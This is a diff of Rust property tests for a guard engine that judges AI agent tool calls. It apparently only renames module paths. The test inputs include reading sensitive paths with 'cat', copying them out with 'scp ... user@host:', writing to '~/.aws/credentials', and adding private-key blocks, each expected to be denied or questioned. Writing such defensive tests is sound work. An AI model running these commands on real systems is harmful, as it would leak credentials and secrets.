@@ -1,4 +1,4 @@
-//! End-to-end property tests for [`ptuf::Engine`].
+//! End-to-end property tests for [`crate::Engine`].
 //!
 //! Per-module unit-style PBT lives inside `src/<module>.rs` next to the
 //! invariant under test. This file owns the cross-module property that
@@ -8,14 +8,12 @@
 //! hook-output protocol.
 //!
 
-#![allow(clippy::expect_used)]
-
 use proptest::prelude::*;
 
-use ptuf::decision::DecisionKind;
-use ptuf::hook_output::from_decision;
-use ptuf::testing::proptest::{arbitrary_command, hook_input};
-use ptuf::{Decision, Engine};
+use crate::decision::DecisionKind;
+use crate::hook_output::from_decision;
+use crate::testing::proptest::{arbitrary_command, hook_input};
+use crate::{Decision, Engine};
 
 /// Build an engine with the default configuration via the public
 /// builder. Cannot fail for `Config::default()` because no plugin
@@ -37,7 +35,7 @@ proptest! {
     // string must not panic.
     #[test]
     fn pbt_engine_handles_arbitrary_bash_strings(cmd in arbitrary_command()) {
-        let input = ptuf::HookInput {
+        let input = crate::HookInput {
             tool_name: "Bash".into(),
             tool_input: serde_json::json!({ "command": cmd }),
         };
@@ -76,7 +74,7 @@ proptest! {
     #[test]
     fn pbt_stateless_decide_matches_engine(input in hook_input()) {
         let engine_dec = default_engine().decide(&input).decision;
-        let shim_dec = ptuf::decide(&input);
+        let shim_dec = crate::decide(&input);
         prop_assert_eq!(engine_dec, shim_dec);
     }
 
@@ -101,7 +99,7 @@ proptest! {
     #[test]
     fn pbt_default_engine_outcome_is_enforce(input in hook_input()) {
         let outcome = default_engine().decide(&input);
-        prop_assert_eq!(outcome.mode, ptuf::config::Mode::Enforce);
+        prop_assert_eq!(outcome.mode, crate::config::Mode::Enforce);
         prop_assert!(!outcome.mode_demoted);
     }
 
@@ -140,7 +138,7 @@ proptest! {
     fn pbt_sensitive_path_parity_across_surfaces(p in sensitive_path_sample()) {
         let engine = default_engine();
 
-        let read = engine.decide(&ptuf::HookInput {
+        let read = engine.decide(&crate::HookInput {
             tool_name: "Read".into(),
             tool_input: serde_json::json!({ "file_path": p }),
         }).decision;
@@ -149,7 +147,7 @@ proptest! {
             "Read {:?} must Deny, got {:?}", p, read,
         );
 
-        let bash_read = engine.decide(&ptuf::HookInput {
+        let bash_read = engine.decide(&crate::HookInput {
             tool_name: "Bash".into(),
             tool_input: serde_json::json!({ "command": format!("cat {p}") }),
         }).decision;
@@ -158,7 +156,7 @@ proptest! {
             "cat {:?} must be >= Ask, got {:?}", p, bash_read,
         );
 
-        let exfil = engine.decide(&ptuf::HookInput {
+        let exfil = engine.decide(&crate::HookInput {
             tool_name: "Bash".into(),
             tool_input: serde_json::json!({ "command": format!("scp {p} user@host:") }),
         }).decision;
@@ -177,7 +175,7 @@ proptest! {
 #[test]
 fn write_of_docs_mentioning_secret_paths_is_allowed() {
     let dec = default_engine()
-        .decide(&ptuf::HookInput {
+        .decide(&crate::HookInput {
             tool_name: "Write".into(),
             tool_input: serde_json::json!({
                 "file_path": "/repo/docs/setup.md",
@@ -192,7 +190,7 @@ fn write_of_docs_mentioning_secret_paths_is_allowed() {
 #[test]
 fn write_to_aws_credentials_path_still_denied() {
     let dec = default_engine()
-        .decide(&ptuf::HookInput {
+        .decide(&crate::HookInput {
             tool_name: "Write".into(),
             tool_input: serde_json::json!({
                 "file_path": "~/.aws/credentials",
@@ -206,7 +204,7 @@ fn write_to_aws_credentials_path_still_denied() {
 #[test]
 fn write_of_pem_body_still_denied() {
     let dec = default_engine()
-        .decide(&ptuf::HookInput {
+        .decide(&crate::HookInput {
             tool_name: "Write".into(),
             tool_input: serde_json::json!({
                 "file_path": "/repo/notes.md",
@@ -219,7 +217,7 @@ fn write_of_pem_body_still_denied() {
 #[test]
 fn apply_patch_of_pem_body_still_denied() {
     let dec = default_engine()
-        .decide(&ptuf::HookInput {
+        .decide(&crate::HookInput {
             tool_name: "apply_patch".into(),
             tool_input: serde_json::json!({
                 "command": "*** Begin Patch\n*** Add File: /repo/notes.md\n+-----BEGIN RSA PRIVATE KEY-----\n+X\n+-----END RSA PRIVATE KEY-----\n*** End Patch\n",
@@ -232,7 +230,7 @@ fn apply_patch_of_pem_body_still_denied() {
 #[test]
 fn apply_patch_deleting_pem_body_still_allowed() {
     let dec = default_engine()
-        .decide(&ptuf::HookInput {
+        .decide(&crate::HookInput {
             tool_name: "apply_patch".into(),
             tool_input: serde_json::json!({
                 "command": "*** Begin Patch\n*** Update File: /repo/notes.md\n -----BEGIN RSA PRIVATE KEY-----\n-leaked\n*** End Patch\n",
